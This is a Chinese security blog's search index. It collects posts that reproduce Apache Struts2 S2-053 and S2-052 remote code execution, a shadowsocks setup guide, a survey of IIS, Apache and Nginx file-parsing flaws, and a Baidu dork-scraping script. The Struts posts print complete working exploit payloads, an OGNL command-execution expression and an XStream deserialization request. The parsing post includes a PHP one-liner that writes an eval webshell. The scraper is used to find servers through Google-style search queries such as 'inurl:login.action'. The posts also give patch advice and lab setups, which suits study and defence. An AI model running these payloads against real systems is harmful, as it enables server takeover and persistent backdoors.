<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[s2-053漏洞复现]]></title>
    <url>%2F2017%2F09%2F13%2Fs2-053%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞 漏洞编号CVE-2017-12611 漏洞名称Freemarker标签远程代码执行漏洞 漏洞评级中危 影响范围Struts 2.0.1 - 2.3.33Struts 2.5 - 2.5.10 s2-053 POC1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125; 注意：执行命令的地方在于(#cmd=’whoami’) 漏洞环境搭建可以使用war包或docker复现 使用war包搭建环境下载war包 链接：http://pan.baidu.com/s/1qXW3FPi 密码：9exb下载后把它放到tomcat目录下的webapps目录下，重启tomcat后访问：http://127.0.0.1:8080/s2-053 使用docker搭建环境快速搭建各种漏洞环境(Various vulnerability environment) https://github.com/Medicean/VulApps搭建好后访问 http://127.0.0.1:8080/hello.action 漏洞复现漏洞检测打开页面，输入表达式%{33-1}进行测试，发现成功执行，返回32说明漏洞存在 执行POC输入POC提交 来个调用计算器（calc）把(#cmd=’whoami’)里面的whoami缓存calc 漏洞分析当在Freemarker标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行1234&lt;@s.hidden name=&quot;strutsS&quot; value=strutsS/&gt; &lt;@s.hidden name=&quot;strutsS&quot; value=&quot;$&#123;strutsS&#125;&quot; /&gt; 这两种情况下，值属性都使用可写属性，都会受到Freemarker表达式影响 修复方案1.升级到Apache Struts 2.5.13或2.3.342.Freemarker标签内容不要通过Request方式获取3.使用只读属性来初始化value属性（仅限getter属性）4.不要使用如下结构&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>s2-053</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-052复现]]></title>
    <url>%2F2017%2F09%2F08%2Fs2-052%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究 s2-052漏洞介绍问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12 s2-052 POC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/xmlContent-Length: 2365Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7Connection: closeUpgrade-Insecure-Requests: 1&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt;&lt;/map&gt; 注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了12345&lt;command&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/command&gt; s2-052漏洞复现安装Java下载JDK在官网上下载JDK http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html我是在windows上搭建的所以，下载windows版本的 配置环境变量1 新建系统变量：变量名:JAVA_HOME变量值:你的JDK安装目录2 再新建系统变量：变量名:CLASSPATH值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN注意：前面的点号3 修改PATH变量变量名：PATH值：;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;注意：前面的分号，将此值添加到，path变量值的最后面 安装Tomcat下载Tomcat在官网上下载Tomcat http://tomcat.apache.org/download-90.cgi下载你需要的版本下载完成以后解压到你想解压的目录就可以了 配置Tomcat的环境变量新建Tomcat环境变量变量名:TOMCAT_HOME变量值:你的TOMCAT所在目录 启动Tomcat打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查 访问：http://127.0.0.1:8080注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。 下载受影响的struts2版本1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 http://127.0.0.1:8080/struts2-rest-showcase/ 会跳转，然后出现下面的页面 开始复现进入编辑页面设置抓包，点击提交按钮修改Content-Type和POST提交的数据可以看到计算器已经调用出来 修补方法1.升级Struts到2.5.13最新版本。2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs python验证脚本https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>s2-052</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建shadowsocks服务]]></title>
    <url>%2F2017%2F09%2F02%2F%E6%90%AD%E5%BB%BAshadowsocks%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。 安装前的准备安装pip从pip官网 https://pypi.python.org/pypi/pip 下载pip的源代码 #解压1tar -zxvf pip-1.5.5.tar.gz 这个时候会报错说少了setuptools从setuptools官网 https://pypi.python.org/pypi/setuptools 下载setuptools原来 #解压12tar -zxvf setuptools-3.6.tar.gz cd setuptools-3.6 #安装1python setup.py install 再次安装pip就OK了 安装M2Crypto先安装依赖包：1yum install -y openssl-devel gcc swig python-devel autoconf libtool 再通过pip安装M2Crypto：1pip install M2Crypto 安装shadowsocks使用pip安装shadowsocks1pip install shadowsocks 配置config文件1vim /etc/shadowsocks.json 单用户配置:12345678910&#123;&quot;server&quot;:&quot;&quot;, ##服务器ip地址&quot;server_port&quot;:8000, ##代理端口&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;local_port&quot;:1080, ##本地监听端口&quot;password&quot;:&quot;&quot;, ##连接密码&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;, ##加密方式&quot;dast_open&quot;:false&#125; 多用户配置:123456789101112&#123;&quot;server&quot;:&quot;&quot;,&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;local_port&quot;:1080,&quot;port_password&quot;:&#123;&quot;8000&quot;:&quot;123456&quot;,&quot;8001&quot;:&quot;123456&quot;&#125;,&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;:false&#125; 命令行启动关闭12ssserver -c /etc/shadowsocks/config.json -d start 后台启动ssserver -c /etc/shadowsocks/config.json -d stop 后台停止 设置开机启动将启动的命令加入到/etc/rc.local文件的最后1vi /etc/rc.local 设置非root用户运行ss12useradd ssuser //添加一个ssuser用户ssserver [other options] --user ssuser //用ssuser这个用户来运行ss 将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser 防火墙设置（如有）编辑防火墙配置文件/etc/sysconfig/iptables，将服务器端口（server_port）放行。新增一条防火墙规则：1-A INPUT -m state --state NEW -m tcp -p tcp --dport 8989 -j ACCEPT 重启防火墙iptables：1service iptables restart 安装客户端windows安装shadowsocks客户端比较简单，直接下载安装程序。启动以后，填入服务端相应的配置（ip，port，密码，加密方式）设置模式：]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器解析漏洞]]></title>
    <url>%2F2017%2F09%2F01%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。 一.IIS5.x-6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件 目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa/test.cer/test.cdx 修复方案1.禁止用户控制文件上传目录，新建目录等权限2.上传目录与用户新建的目录禁止执行3.上传的文件重命名，不保留用户上传文件的后缀4.禁止asa、asp、cer、cdx等后缀的文件上传 二.apache解析漏洞漏洞原理 Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 漏洞形式www.xxxx.xxx.com/test.php.php123 其余配置问题导致漏洞（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行 修复方案1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入1234&lt;Files ~ “.(php.|php3.)”&gt;Order Allow,DenyDeny from all&lt;/Files&gt; 2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下1234567891011&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) /index.phpRewriteRule .(pHp.|pHp3.) /index.phpRewriteRule .(phP.|phP3.) /index.phpRewriteRule .(Php.|Php3.) /index.phpRewriteRule .(PHp.|PHp3.) /index.phpRewriteRule .(PhP.|PhP3.) /index.phpRewriteRule .(pHP.|pHP3.) /index.phpRewriteRule .(PHP.|PHP3.) /index.php&lt;/IfModule&gt; 三.Nginx &lt; 8.03畸形解析漏洞漏洞原理Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 漏洞形式www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\0.php 另外一种手法：上传一个名字为test.jpg，以下内容的文件。1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt; 然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 修复方案1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;2.在Nginx配置文件中添加以下代码：1234if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403; &#125; 这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。3.升级Nignx到最新版 四.IIS7.5解析漏洞IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>服务器解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取百度搜索]]></title>
    <url>%2F2017%2F09%2F01%2F%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。 网页分析分析搜索链接每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条1https://www.baidu.com/s?wd=ctf&amp;pn=10 分析搜索页面中的链接F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种1a target=&quot;_blank&quot; href=&quot;你搜索的URL&quot; class=&quot;c-showurl&quot; style=&quot;text-decoration:none;&quot;&gt;www.php.net/downloa...php 特征就是class=”c-showurl” 属性值，用bs库去获取所有有这个属性的tagres = soup.find_all(name=”a”, attrs={‘class’:’c-showurl’}) 访问链接访问跳转链接获取实际网站url,title之类的信息 爬虫实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/usr/bin/env python#coding=utf-8#输入格式 python 脚本 -s 内容 -f 要保存的文件名#每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条#https://www.baidu.com/s?wd=ctf&amp;pn=10#F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种#&lt;a target="_blank" href="http://www.baidu.com/link?url=GI9K125i3rnLbxL2-kKs-2g2OZt-oDTJZZIFjndQHxGiDubfIEpvNxnnCc1h5ags" class="c-showurl" style="text-decoration:none;"&gt;www.secbox.cn/tag/&lt;b&gt;ctf&lt;/b&gt;&amp;nbsp;&lt;/a&gt;import requests from bs4 import BeautifulSoup as bsimport threading #多线程import re #正则from Queue import Queue #线程优先级队列（ Queue）from prettytable import PrettyTable #将输出内容如表格方式整齐 import argparse #命令行解析import timeimport systhread_count = 3 #进程数page = 5 #可以修改抓取页数urls = []table = PrettyTable(['page','url','title']) #prettyx模块将输出内容如表格方式整齐table.align['title'] = '1' #title左对齐table.padding_width = 1 #列边和内容之间的一个空格page = (page+1) * 10class mythread(threading.Thread): #继承父类threading.Thread def __init__(self,queue): threading.Thread.__init__(self) self.Q = queue self.headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'&#125; #设置请求头 def run(self): ##把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 while 1: try: t = self.Q.get(True,1) #print t self.spider(t) except Exception,e: #调试最好打印出错信息，否则，spider函数出错也无法定位错误，多次遇到这个问题了,靠打印才解决 print e break def spider(self,target): #爬取网页链接和标题 #print type(target) pn =int(target.split('=')[-1])/10 + 1 #对https://www.baidu.com/s?wd=ctf&amp;pn=10分割去最后的数字 #print pn #print target html = requests.get(target,headers=self.headers) #print html soup = bs(html.text,'lxml') res = soup.find_all(name='a', attrs=&#123;'class':'c-showurl'&#125;) #print res for r in res: try: #因为百度搜索是302跳转，所以我们需要再次请求 h = requests.get(r['href'],headers=self.headers,timeout=3) if h.status_code == 200: url = h.url title =re.findall(r'&lt;title&gt;(.*?)&lt;/title&gt;',h.content)[0] title = title.decode('utf-8') #解码成unicode,否则add_row会转换出错 urls.append((pn,url,title)) else: continue except: continuedef Load_Thread(queue): #生成线程数 return [mythread(queue) for i in range(thread_count)]def Start_Thread(threads): print 'thread is start...' for t in threads: t.setDaemon(True) t.start() for t in threads: t.join() print 'thread is end...'def main(): start = time.time() parser = argparse.ArgumentParser() parser.add_argument('-s') parser.add_argument('-f') arg = parser.parse_args() #print arg word = arg.s output = arg.f # word = 'inurl:login.action' # output = 'test.txt' queue = Queue() for i in range(0,page,10): target = 'https://www.baidu.com/s?wd=%s&amp;pn=%s'%(word,i) queue.put(target) thread_list = Load_Thread(queue) Start_Thread(thread_list) #把数据写到文件中 if output: with open(output,'a') as f: for record in urls: f.write(record[1]+'\n') #print urls,len(urls) for record in urls: table.add_row(list(record)) #在表单中添加数据 print table print '共爬取数据%s条'%len(urls) print time.time()-startif __name__ == '__main__': main()]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试常用脑图]]></title>
    <url>%2F2017%2F08%2F31%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E8%84%91%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[渗透测试脑图 漏洞脑图web常见漏洞脑图 xss攻击点汇总脑图 密码找回逻辑漏洞脑图 越权脑图 工具脑图sqlmap脑图 nmap脑图 提权脑图]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>脑图</tag>
      </tags>
  </entry>
</search>
